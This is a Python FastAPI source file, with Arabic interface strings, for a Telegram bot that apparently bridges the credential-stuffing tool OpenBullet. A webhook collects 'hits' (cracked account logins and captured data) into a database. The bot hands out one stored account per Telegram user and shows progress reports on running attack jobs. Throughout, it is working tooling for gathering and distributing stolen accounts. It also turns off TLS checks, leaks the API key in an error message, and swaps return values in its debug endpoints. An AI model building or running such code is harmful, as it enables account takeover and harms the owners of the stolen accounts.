from fastapi import FastAPI, Request
import httpx
import os
import logging
import hashlib
from sqlalchemy import create_engine, Column, Integer, String, Boolean, func
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker

# ==================== LOGGING ====================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"
)
logger = logging.getLogger("OB_Bridge")

app = FastAPI()

# ==================== CONFIGURATION ====================
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
ADMIN_IDS = os.getenv("ADMIN_IDS", "6624995237").split(",")

OPENBULLET_URL = os.getenv("OPENBULLET_URL")
OPENBULLET_API_KEY = os.getenv("OPENBULLET_API_KEY")

DATABASE_URL = os.getenv("DATABASE_URL")
if DATABASE_URL and DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)

# ==================== DATABASE ====================
engine = create_engine(DATABASE_URL, pool_pre_ping=True, pool_recycle=300)
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base = declarative_base()


class Account(Base):
    __tablename__ = "accounts"
    id = Column(Integer, primary_key=True, index=True)
    config_name = Column(String, index=True)
    account_data = Column(String, unique=True, index=True)
    captured_data = Column(String)
    is_given = Column(Boolean, default=False)


class DeliveredAccount(Base):
    __tablename__ = "delivered_accounts"
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(String, unique=True, index=True)


Base.metadata.create_all(bind=engine)

# ==================== HELPERS ====================


def config_hash(name: str) -> str:
    return hashlib.md5(name.encode("utf-8")).hexdigest()[:12]


def safe_md(text: str) -> str:
    if not text:
        return ""
    return str(text).replace("`", "'").replace("\\", "/")


def resolve_progress(val) -> str:
    try:
        p = float(val) if val is not None else 0.0
    except (TypeError, ValueError):
        return "0.0"
    if p <= 1.0:
        return f"{p * 100:.1f}"
    return f"{p:.1f}"


# ==================== KEYBOARDS ====================


def get_main_keyboard(is_admin: bool):
    buttons = [
        [
            {"text": "⚡ 🧬 سحب حساب جديد 🧬 ⚡"},
            {"text": "📡 🌐 إحصائيات المخزن 🌐 📡"},
        ],
        [{"text": "🤖 ⚔️ عمليات أوبن بلوت الجارية ⚔️ 🤖"}],
    ]
    if is_admin:
        buttons.append([{"text": "🛠️ 👾 لوحة تحكم المطور 👾 🛠️"}])
    return {
        "keyboard": buttons,
        "resize_keyboard": True,
        "one_time_keyboard": False,
    }


def get_inline_control_buttons():
    return {
        "inline_keyboard": [
            [
                {"text": "🧹 تصفير الموزع", "callback_data": "reset_delivered"},
                {"text": "🚨 تصفير المخزن بالكامل", "callback_data": "clear_accounts"},
            ],
            [
                {"text": "🔄 تحديث بيانات اللوحة", "callback_data": "refresh_admin_stats"}
            ],
        ]
    }


# ==================== TELEGRAM SENDER WRAPPERS ====================


async def tg_send(chat_id: str, text: str, **kwargs):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    payload.update(kwargs)
    async with httpx.AsyncClient(verify=False, timeout=10.0) as c:
        try:
            await c.post(url, json=payload)
        except Exception as e:
            logger.error(f"tg_send failed: {e}")


async def tg_edit(chat_id: str, message_id: int, text: str, **kwargs):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/editMessageText"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": "Markdown",
    }
    payload.update(kwargs)
    async with httpx.AsyncClient(verify=False, timeout=10.0) as c:
        try:
            await c.post(url, json=payload)
        except Exception as e:
            logger.error(f"tg_edit failed: {e}")


async def tg_answer(callback_id: str, text: str, show_alert: bool = False):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery"
    async with httpx.AsyncClient(verify=False, timeout=10.0) as c:
        try:
            await c.post(
                url,
                json={
                    "callback_query_id": callback_id,
                    "text": text,
                    "show_alert": show_alert,
                },
            )
        except Exception as e:
            logger.error(f"tg_answer failed: {e}")


# ==================== OPENBULLET API CLIENT ====================


def _find_auth(base: str, raw_key: str) -> tuple:
    """
    يجرب 3 صيغ مصادقة ويرجع (headers, label) للصيغة الناجحة أو (None, None).
    """
    methods = [
        ({"Authorization": raw_key, "Accept": "application/json"}, "مباشر"),
        ({"Authorization": f"Bearer {raw_key}", "Accept": "application/json"}, "Bearer"),
        ({"X-API-Key": raw_key, "Accept": "application/json"}, "X-API-Key"),
    ]

    async def _test():
        async with httpx.AsyncClient(verify=False, timeout=15.0) as client:
            for hdrs, label in methods:
                try:
                    resp = await client.get(f"{base}/api/v1/job/all", headers=hdrs)
                    if resp.status_code == 200 and "json" in resp.headers.get("content-type", ""):
                        return hdrs, label
                except Exception:
                    pass
        return None, None

    # لا يمكن استدعاء async هنا مباشرة، سنستخدمها في fetch_ob_status
    return methods  # نرجع القائمة لاستخدامها هناك


async def _auto_auth(base: str, raw_key: str) -> tuple:
    """يجرب صيغ المصادقة ويرجع (headers, label)."""
    methods = [
        ({"Authorization": raw_key, "Accept": "application/json"}, "مباشر"),
        ({"Authorization": f"Bearer {raw_key}", "Accept": "application/json"}, "Bearer"),
        ({"X-API-Key": raw_key, "Accept": "application/json"}, "X-API-Key"),
    ]
    async with httpx.AsyncClient(verify=False, timeout=15.0) as client:
        for hdrs, label in methods:
            try:
                resp = await client.get(f"{base}/api/v1/job/all", headers=hdrs)
                if resp.status_code == 200 and "json" in resp.headers.get("content-type", ""):
                    logger.info(f"✅ Auth '{label}' works")
                    return hdrs, label
            except Exception as e:
                logger.error(f"Auth '{label}' error: {e}")
    return None, None


def _unwrap(obj: dict) -> dict:
    """يفك غلاف 'value' إن وُجد (OB2 pattern)."""
    if not isinstance(obj, dict):
        return obj
    if "value" in obj and isinstance(obj["value"], dict):
        merged = {k: v for k, v in obj.items() if k != "value"}
        merged.update(obj["value"])
        return merged
    return obj


def _g(obj: dict, *keys):
    """يبحث عن أول مفتاح موجود."""
    for k in keys:
        if obj and k in obj and obj[k] is not None:
            return obj[k]
    return None


def _num(val, fallback=0) -> int:
    try:
        return int(float(val)) if val is not None else fallback
    except (TypeError, ValueError):
        return fallback


def _is_active(status_val) -> bool:
    if status_val is None:
        return False
    return str(status_val).strip().lower() in ("running", "active", "started", "executing")


async def fetch_ob_status() -> dict:
    """
    الاستراتيجية الجديدة:
      1. المصادقة التلقائية (3 صيغ)
      2. جلب قائمة العمليات من /api/v1/job/all
      3. فلتر العمليات النشطة
      4. لكل عملية نشطة، جلب تفاصيلها من /api/v1/job/{id}
      5. دمج البيانات الأساسية مع التفصيلية
    """
    if not OPENBULLET_URL or not OPENBULLET_API_KEY:
        return {"error": "متغيرات البيئة غير مكتملة.", "jobs": [], "monitors": []}

    base = OPENBULLET_URL.strip().rstrip("/")
    raw_key = OPENBULLET_API_KEY.strip()

    # ---- الخطوة 1: المصادقة ----
    headers, auth_label = await _auto_auth(base, raw_key)
    if not headers:
        return {
            "error": (
                "فشلت كل صيغ المصادقة.\n\n"
                f"🔗 الرابط: `{base}`\n"
                f"🔑 المفتاح: `{raw_key}`\n\n"
                "**تأكد:**\n"
                "1. OB → Settings → General\n"
                "2. Admin API Key → الصق المفتاح\n"
                "3. Save Settings"
            ),
            "jobs": [],
            "monitors": [],
        }

    result = {
        "auth_method": auth_label,
        "jobs": [],       # العمليات النشطة مع تفاصيلها الكاملة
        "monitors": [],
        "total_all": 0,   # إجمالي العمليات
    }

    async with httpx.AsyncClient(verify=False, timeout=15.0) as client:

        # ---- الخطوة 2: جلب القائمة ----
        try:
            resp = await client.get(f"{base}/api/v1/job/all", headers=headers)
            if resp.status_code != 200:
                return {
                    "error": f"فشل جلب القائمة: HTTP {resp.status_code}",
                    "jobs": [], "monitors": [],
                }

            list_data = resp.json()
            if isinstance(list_data, dict) and "items" in list_data:
                all_jobs = list_data["items"]
            elif isinstance(list_data, list):
                all_jobs = list_data
            else:
                all_jobs = []

            result["total_all"] = len(all_jobs)

        except Exception as e:
            return {"error": f"خطأ في جلب القائمة: {e}", "jobs": [], "monitors": []}

        # ---- الخطوة 3: فلتر النشطة ----
        running_ids = []
        for j in all_jobs:
            if not isinstance(j, dict):
                continue
            status = j.get("status", "")
            if _is_active(status):
                job_id = j.get("id")
                if job_id is not None:
                    running_ids.append({
                        "id": job_id,
                        "name": j.get("name", "بدون اسم"),
                        "status": status,
                    })

        if not running_ids:
            return result  # لا عمليات نشطة

        # ---- الخطوة 4: جلب تفاصيل كل عملية نشطة ----
        for item in running_ids:
            job_id = item["id"]
            detail = {
                "id": job_id,
                "name": item["name"],
                "status": item["status"],
                "progress": None,
                "cpm": None,
                "hits": None,
                "custom": None,
                "total": None,
                "bad": None,
                "raw_keys": [],
            }

            try:
                resp = await client.get(
                    f"{base}/api/v1/job/{job_id}",
                    headers=headers
                )
                if resp.status_code == 200:
                    raw = resp.json()
                    # فك الغلاف إن وُجد
                    unwrapped = _unwrap(raw) if isinstance(raw, dict) else raw

                    if isinstance(unwrapped, dict):
                        detail["raw_keys"] = list(unwrapped.keys())
                        logger.info(f"Job {job_id} detail keys: {detail['raw_keys']}")

                        # استخراج القيم بأسماء متعددة
                        detail["progress"] = _g(
                            unwrapped,
                            "progress", "completionRatio", "completionRate",
                            "percent", "completion"
                        )
                        detail["cpm"] = _g(
                            unwrapped,
                            "cpm", "speed", "checkSpeed", "checksPerMinute"
                        )
                        detail["hits"] = _g(
                            unwrapped,
                            "hits", "hitsCount", "good", "goodCount", "success"
                        )
                        detail["custom"] = _g(
                            unwrapped,
                            "custom", "customCount", "captured"
                        )
                        detail["total"] = _g(
                            unwrapped,
                            "total", "totalChecks", "checked", "dataTested"
                        )
                        detail["bad"] = _g(
                            unwrapped,
                            "bad", "badCount", "fail", "failed", "toCheck"
                        )

                        # تحديث الاسم إن وُجد أكثر دقة في التفاصيل
                        better_name = _g(unwrapped, "name", "jobName", "configName")
                        if better_name:
                            detail["name"] = better_name

                else:
                    logger.warning(f"Job {job_id} detail returned HTTP {resp.status_code}")

            except Exception as e:
                logger.error(f"Error fetching job {job_id} detail: {e}")

            result["jobs"].append(detail)

        # ---- الخطوة 5: مراقبات العمليات (إن وُجدت) ----
        try:
            resp = await client.get(f"{base}/api/v1/jobmonitor/all", headers=headers)
            if resp.status_code == 200:
                mon_data = resp.json()
                monitors = []
                if isinstance(mon_data, dict) and "items" in mon_data:
                    monitors = mon_data["items"]
                elif isinstance(mon_data, list):
                    monitors = mon_data

                for m in monitors:
                    if not isinstance(m, dict):
                        continue
                    if _is_active(m.get("status")):
                        uw = _unwrap(m)
                        result["monitors"].append({
                            "name": _g(uw, "name") or "مراقب",
                            "progress": _g(uw, "progress", "completionRatio"),
                            "cpm": _g(uw, "cpm", "checkSpeed"),
                            "hits": _g(uw, "hits", "goodCount"),
                            "custom": _g(uw, "custom", "customCount"),
                            "total": _g(uw, "total", "totalChecks"),
                            "bad": _g(uw, "bad", "badCount"),
                        })
        except Exception as e:
            logger.error(f"Error fetching monitors: {e}")

    return result


def format_ob_message(ob_data: dict) -> str:
    """يحوّل البيانات لرسالة تلغرام."""

    if "error" in ob_data and ob_data.get("jobs") is None:
        return f"❌ **خطأ:**\n{ob_data['error']}"

    auth_line = ""
    if ob_data.get("auth_method"):
        auth_line = f"🔑 **المصادقة:** `{ob_data['auth_method']}`\n"

    jobs = ob_data.get("jobs", [])
    monitors = ob_data.get("monitors", [])
    total_all = ob_data.get("total_all", 0)
    total_active = len(jobs) + len(monitors)

    if total_active == 0:
        return (
            "💤 **حالة الـ Mainframe:** `خامل (IDLE)`\n\n"
            f"{auth_line}"
            f"📊 **إجمالي العمليات المسجلة:** `{total_all}`\n"
            f"🟢 **العمليات النشطة:** `0`\n\n"
            "_لا توجد عمليات فحص نشطة حالياً._"
        )

    lines = [
        "⚙️ **「 شاشة مراقبة OPENBULLET 」** ⚙️\n",
        auth_line,
        f"⚡ **العمليات النشطة:** `{total_active}` من `{total_all}`",
        "━━━━━━━━━━━━━━━━━━━━",
    ]

    # تمييز العمليات المتكررة
    name_count = {}
    for j in jobs:
        n = j["name"]
        name_count[n] = name_count.get(n, 0) + 1
    name_seen = {}

    for job in jobs:
        name = safe_md(job["name"])
        if name_count.get(job["name"], 0) > 1:
            name_seen[job["name"]] = name_seen.get(job["name"], 0) + 1
            name = f"{name} #{name_seen[job['name']]}"

        hits = _num(job["hits"])
        custom = _num(job["custom"])
        total = _num(job["total"])
        bad = _num(job["bad"])
        cpm = _num(job["cpm"])
        progress = resolve_progress(job["progress"])

        lines.append(f"📦 **عملية:** `{name}`")
        lines.append(f"   🆔 المعرف: `{job['id']}`")
        lines.append(f"   📊 التقدم: `{progress}%`")

        if total > 0:
            lines.append(f"   📋 تم فحص: `{total}`")
            lines.append(f"   🎯 Hits: `{hits}`")
            if custom > 0:
                lines.append(f"   ⭐ Custom: `{custom}`")
            lines.append(f"   ❌ Fail: `{bad}`")
        else:
            lines.append(f"   🎯 Hits: `{hits}`")
            if custom > 0:
                lines.append(f"   ⭐ Custom: `{custom}`")

        lines.append(f"   ⚡ السرعة: `{cpm}` CPM")
        lines.append("━━━━━━━━━━━━━━━━━━━━")

    for mon in monitors:
        name = safe_md(mon["name"])
        hits = _num(mon["hits"])
        custom = _num(mon["custom"])
        total = _num(mon["total"])
        cpm = _num(mon["cpm"])
        progress = resolve_progress(mon["progress"])

        lines.append(f"🔄 **مراقب مستمر:** `{name}`")
        lines.append(f"   📊 التقدم: `{progress}%`")
        if total > 0:
            lines.append(f"   📋 تم فحص: `{total}`")
        lines.append(f"   🎯 Hits: `{hits}`")
        if custom > 0:
            lines.append(f"   ⭐ Custom: `{custom}`")
        lines.append(f"   ⚡ السرعة: `{cpm}` CPM")
        lines.append("━━━━━━━━━━━━━━━━━━━━")

    return "\n".join(lines)


# ==================== WEBHOOK: HIT FROM OPENBULLET ====================


@app.post("/webhook/hit")
async def receive_hit(request: Request):
    db = SessionLocal()
    try:
        data = await request.json()

        config_name = "UNKNOWN"
        for key in ("config", "configName", "ConfigName"):
            if data.get(key):
                config_name = data.get(key)
                break
        if config_name == "UNKNOWN" and data.get("variables"):
            for var in data.get("variables", []):
                if isinstance(var, dict) and var.get("name") in (
                    "Config.Name", "config", "Config",
                ):
                    config_name = var.get("value", "UNKNOWN")
                    break

        config_name = (
            os.path.basename(str(config_name))
            .replace(".anom", "").replace(".opk", "").strip()
        )
        account_data = str(data.get("data") or data.get("account") or "NO_DATA").strip()
        captured_data = str(
            data.get("captured") or data.get("capturedData")
            or data.get("variables") or "NO_CAPTURED_DATA"
        ).strip()[:5000]

        if db.query(Account).filter(Account.account_data == account_data).first():
            return {"status": "ignored"}

        db.add(Account(
            config_name=config_name or "UNKNOWN",
            account_data=account_data,
            captured_data=captured_data,
            is_given=False,
        ))
        db.commit()
        logger.info(f"Hit stored: {config_name}")
        return {"status": "success"}

    except Exception as e:
        db.rollback()
        logger.error(f"/webhook/hit error: {e}", exc_info=True)
        return {"status": "error", "message": str(e)}
    finally:
        db.close()


# ==================== WEBHOOK: TELEGRAM ====================


@app.post("/webhook/telegram")
async def telegram_webhook(request: Request):
    db = SessionLocal()
    try:
        payload = await request.json()

        # ===================== CALLBACK QUERY =====================
        if "callback_query" in payload:
            cb = payload["callback_query"]
            callback_id = cb["id"]
            chat_id = str(cb["message"]["chat"]["id"])
            message_id = cb["message"]["message_id"]
            data = cb["data"]

            if data.startswith("claim_cfg:"):
                cfg_h = data.split("claim_cfg:", 1)[1]
                all_cfgs = (
                    db.query(Account.config_name)
                    .filter(Account.is_given == False)
                    .distinct().all()
                )
                selected = None
                for (name,) in all_cfgs:
                    if config_hash(name) == cfg_h:
                        selected = name
                        break

                if not selected:
                    await tg_answer(callback_id, "❌ لم يتم العثور على هذا النوع!", show_alert=True)
                    return {"status": "ok"}

                if db.query(DeliveredAccount).filter(DeliveredAccount.user_id == chat_id).first():
                    await tg_answer(callback_id, "❌ لقد سحبت حصتك سابقاً!", show_alert=True)
                    return {"status": "ok"}

                account = (
                    db.query(Account)
                    .filter(Account.config_name == selected, Account.is_given == False)
                    .with_for_update().first()
                )

                if not account:
                    await tg_answer(callback_id, "😔 نفدت الحسابات من هذا النوع!", show_alert=True)
                    return {"status": "ok"}

                account.is_given = True
                db.add(DeliveredAccount(user_id=chat_id))
                db.commit()

                reply = (
                    f"🌌 **⚡ 「 تم سحب الحساب بنجاح 」 ⚡** 🌌\n\n"
                    f"📦 **نوع الخدمة:** `{safe_md(account.config_name)}`\n\n"
                    f"👤 **بيانات الحساب:**\n`{safe_md(account.account_data)}`\n\n"
                    f"⚙️ **البيانات المستخرجة:**\n`{safe_md(account.captured_data)}`\n\n"
                    f"🔒 _STATUS: TERMINAL LOCKED_"
                )
                await tg_edit(chat_id, message_id, reply)
                return {"status": "ok"}

            if chat_id not in ADMIN_IDS:
                return {"status": "ok"}

            if data == "reset_delivered":
                count = db.query(DeliveredAccount).count()
                db.query(DeliveredAccount).delete()
                db.commit()
                await tg_answer(callback_id, f"🧹 تم تصفير الموزع ({count} سجل)", show_alert=True)

            elif data == "clear_accounts":
                ac = db.query(Account).count()
                dc = db.query(DeliveredAccount).count()
                db.query(DeliveredAccount).delete()
                db.query(Account).delete()
                db.commit()
                await tg_answer(callback_id, f"🚨 مسح {ac} حساب و {dc} سجل موزع.", show_alert=True)

            elif data == "refresh_admin_stats":
                total = db.query(Account).count()
                avail = db.query(Account).filter(Account.is_given == False).count()
                given = db.query(Account).filter(Account.is_given == True).count()
                txt = (
                    f"┌─── 🌌 **「 لوحة تحكم النيون المتقدمة 」** 🌌\n"
                    f"│\n"
                    f"├── 🟣 **إجمالي الحسابات:** `{total}`\n"
                    f"├── 🟢 **الحسابات الجاهزة:** `{avail}`\n"
                    f"└── 🔴 **الحسابات الموزعة:** `{given}`\n"
                    f"│\n"
                    f"└────────────── [ تحديث مباشر ] 🖥️"
                )
                await tg_edit(chat_id, message_id, txt, reply_markup=get_inline_control_buttons())

            return {"status": "ok"}

        # ===================== TEXT MESSAGE =====================
        if "message" not in payload or "text" not in payload["message"]:
            return {"status": "ignored"}

        chat_id = str(payload["message"]["chat"]["id"])
        text = payload["message"]["text"].strip()
        is_admin = chat_id in ADMIN_IDS

        if text == "/start":
            await tg_send(
                chat_id,
                "🌌 **WELCOME TO THE CYBERPUNK DISTRIBUTOR CORE** 🌌\n\n"
                "⚡ `الحالة: متصل بالشبكة الآمنة`\n"
                "🎛️ `الواجهة: ثيم التوزيع التفاعلي v4.8`\n\n"
                "🤖 _اضغط على سحب حساب بالأسفل لتفقد الخيارات المتاحة لك..._",
                reply_markup=get_main_keyboard(is_admin),
            )

        elif text in ("📡 🌐 إحصائيات المخزن 🌐 📡", "/stats"):
            avail = db.query(Account).filter(Account.is_given == False).count()
            await tg_send(
                chat_id,
                "┌─── 📡 **「 مستودع البيانات 」** 📡\n"
                "│\n"
                f"└── 🟢 **المتوفر الإجمالي:** `{avail}` حساب\n"
                "│\n"
                "└───────────── [ مصفوفة حية ] ⚡",
            )

        elif text in ("⚡ 🧬 سحب حساب جديد 🧬 ⚡", "/get"):
            if db.query(DeliveredAccount).filter(DeliveredAccount.user_id == chat_id).first():
                await tg_send(
                    chat_id,
                    "🚨 **SYSTEM DENIAL:** `جدار الحماية نشط` 🚨\n\n"
                    "❌ يسمح النظام بـ **حساب واحد فقط لكل مستخدم**.",
                )
                return {"status": "ok"}

            results = (
                db.query(Account.config_name, func.count(Account.id))
                .filter(Account.is_given == False)
                .group_by(Account.config_name).all()
            )
            results = [(c, n) for c, n in results if c]

            if not results:
                await tg_send(
                    chat_id,
                    "🚨 **MAINFRAME ERROR:** `المستودع فارغ حالياً` 🚨\n\n"
                    "😔 لا توجد حسابات جاهزة للتسليم.",
                )
            else:
                buttons = []
                for cfg_name, count in results:
                    display = cfg_name if len(cfg_name) <= 40 else cfg_name[:37] + "..."
                    buttons.append(
                        [{"text": f"🎁 {display} ({count})", "callback_data": f"claim_cfg:{config_hash(cfg_name)}"}]
                    )
                await tg_send(
                    chat_id,
                    "┌─── 🎛️ **「 قائمة التخصيص والتعيين 」** 🎛️\n"
                    "│\n"
                    "├── ⚡ تم فحص قاعدة البيانات وتجميع الأنواع المتوفرة.\n"
                    "└── 👇 **اختر نوع الحساب الذي ترغب بسحبه:**",
                    reply_markup={"inline_keyboard": buttons},
                )

        elif text == "🤖 ⚔️ عمليات أوبن بلوت الجارية ⚔️ 🤖":
            ob_data = await fetch_ob_status()
            await tg_send(chat_id, format_ob_message(ob_data))

        elif text == "🛠️ 👾 لوحة تحكم المطور 👾 🛠️" and is_admin:
            total = db.query(Account).count()
            avail = db.query(Account).filter(Account.is_given == False).count()
            given = db.query(Account).filter(Account.is_given == True).count()
            await tg_send(
                chat_id,
                "┌─── 🌌 **「 لوحة تحكم النيون المتقدمة 」** 🌌\n"
                "│\n"
                f"├── 🟣 **إجمالي الحسابات:** `{total}`\n"
                f"├── 🟢 **الحسابات الجاهزة:** `{avail}`\n"
                f"└── 🔴 **الحسابات الموزعة:** `{given}`\n"
                "│\n"
                "└────────────── [ أوامر النظام التفاعلية ] 👇",
                reply_markup=get_inline_control_buttons(),
            )

        return {"status": "ok"}

    except Exception as e:
        db.rollback()
        logger.error(f"Telegram webhook error: {e}", exc_info=True)
        return {"status": "error", "message": str(e)}
    finally:
        db.close()


# ==================== DEBUG ENDPOINTS ====================


@app.get("/health")
def health_check():
    return {"status": "healthy"}


@app.get("/debug/ob")
async def debug_ob():
    """
    تشخيص شامل يعرض:
      1. قائمة العمليات (خفيفة)
      2. تفاصيل أول عملية نشطة (كاملة)
      3. أسماء الحقول المتوفرة في التفاصيل
    """
    ob_data = await fetch_ob_status()

    debug_info = {
        "auth": ob_data.get("auth_method"),
        "total_all": ob_data.get("total_all", 0),
        "active_count": len(ob_data.get("jobs", [])),
        "jobs_list_only": [],  # القائمة الخفيفة من /job/all
        "job_detail_raw": None,  # تفاصيل أول عملية نشطة
    }

    # نجلب القائمة الخفيفة للتوضيح
    if OPENBULLET_URL and OPENBULLET_API_KEY:
        base = OPENBULLET_URL.strip().rstrip("/")
        _, headers = await _auto_auth(base, OPENBULLET_API_KEY.strip())
        if headers:
            async with httpx.AsyncClient(verify=False, timeout=15.0) as client:
                try:
                    resp = await client.get(f"{base}/api/v1/job/all", headers=headers)
                    if resp.status_code == 200:
                        data = resp.json()
                        items = data.get("items", data) if isinstance(data, dict) else data
                        debug_info["jobs_list_only"] = items

                        # نجلب تفاصيل أول عملية نشطة
                        for j in (items if isinstance(items, list) else []):
                            if isinstance(j, dict) and _is_active(j.get("status")):
                                jid = j.get("id")
                                if jid is not None:
                                    resp2 = await client.get(
                                        f"{base}/api/v1/job/{jid}", headers=headers
                                    )
                                    if resp2.status_code == 200:
                                        debug_info["job_detail_raw"] = resp2.json()
                                    else:
                                        debug_info["job_detail_raw"] = {
                                            "error": f"HTTP {resp2.status_code}",
                                            "body": resp2.text[:500],
                                        }
                                    break
                except Exception as e:
                    debug_info["fetch_error"] = str(e)

    return debug_info


@app.get("/debug/job/{job_id}")
async def debug_job(job_id: int):
    """يعرض تفاصيل عملية واحدة بالكامل كما جاءت من API."""
    if not OPENBULLET_URL or not OPENBULLET_API_KEY:
        return {"error": "missing config"}

    base = OPENBULLET_URL.strip().rstrip("/")
    _, headers = await _auto_auth(base, OPENBULLET_API_KEY.strip())

    if not headers:
        return {"error": "Auth failed"}

    async with httpx.AsyncClient(verify=False, timeout=15.0) as client:
        resp = await client.get(f"{base}/api/v1/job/{job_id}", headers=headers)
        return {
            "status_code": resp.status_code,
            "content_type": resp.headers.get("content-type", ""),
            "raw_json": resp.json() if resp.status_code == 200 else resp.text[:1000],
        }


@app.post("/setup/webhook")
async def setup_webhook():
    render_url = os.getenv("RENDER_EXTERNAL_URL", "")
    if not render_url:
        return {"error": "RENDER_EXTERNAL_URL not set"}
    webhook_url = f"{render_url.rstrip('/')}/webhook/telegram"
    async with httpx.AsyncClient() as c:
        resp = await c.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/setWebhook",
            json={"url": webhook_url},
        )
    return resp.json()
